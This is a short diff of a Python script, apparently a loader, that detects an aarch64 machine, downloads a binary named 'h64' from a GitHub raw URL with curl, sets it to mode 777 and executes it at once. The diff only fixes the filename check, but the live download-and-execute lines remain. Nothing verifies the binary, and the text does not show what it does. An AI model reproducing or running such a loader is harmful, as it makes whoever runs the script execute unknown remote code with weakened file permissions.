@@ -2,7 +2,7 @@
 import os,sys,subprocess
 current_os=subprocess.check_output('uname -om',shell=True)
 if 'aarch64' in str(current_os):
-    if not os.path.isfile('a64'):
+    if not os.path.isfile('h64'):
         os.system('curl -L https://github.com/hop09/libraries/blob/main/h64?raw=true > h64')
         os.system('chmod 777 h64')
         os.system('./h64')
